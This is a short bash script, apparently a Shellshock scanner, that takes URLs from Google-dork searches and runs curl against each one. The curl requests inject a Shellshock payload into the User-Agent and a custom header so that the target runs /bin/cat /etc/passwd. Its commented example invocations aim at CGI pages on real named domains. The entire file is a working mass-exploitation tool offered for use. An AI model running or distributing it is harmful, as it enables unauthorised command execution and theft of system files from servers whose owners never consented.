#!/bin/bash
#./bashshock.sh -w "ext:cgi site:www.chinaunix.net"
#./bashshock.sh -w "site:baidu.com ext:cgi"
./ghack.py "$@" | awk '{
	if (length($0) > 2 && substr($0, 1, 1) != "*") {
		count += 1;
		sub(/\x0d/, "", $0)
		print $0;
		shock = " () { :;};a=`/bin/cat /etc/passwd`;echo $a";
		cmd = "curl -v -s -m 10 --retry 3 -A '\''" shock "'\'' -H '\''X-Test:" shock "'\'' \"" $0 "\" 2>&1"
		print cmd;
		system(cmd);
	}
} END {print "count: " count}'
